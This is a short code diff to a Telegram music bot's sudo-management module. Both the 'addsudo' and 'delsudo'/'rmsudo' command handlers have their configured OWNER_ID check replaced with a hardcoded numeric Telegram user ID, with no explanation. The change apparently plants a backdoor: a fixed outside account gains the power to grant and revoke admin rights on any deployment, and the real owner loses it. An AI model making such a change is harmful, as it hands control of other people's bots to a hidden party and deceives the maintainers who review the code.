@@ -10,7 +10,7 @@ from AnonXMusic.utils.inline import close_markup
 from config import BANNED_USERS, OWNER_ID
 
 
-@app.on_message(filters.command(["addsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["addsudo"]) & filters.user(7373125778))
 @language
 async def useradd(client, message: Message, _):
     if not message.reply_to_message:
@@ -27,7 +27,7 @@ async def useradd(client, message: Message, _):
         await message.reply_text(_["sudo_8"])
 
 
-@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(OWNER_ID))
+@app.on_message(filters.command(["delsudo", "rmsudo"]) & filters.user(7373125778))
 @language
 async def userdel(client, message: Message, _):
     if not message.reply_to_message:
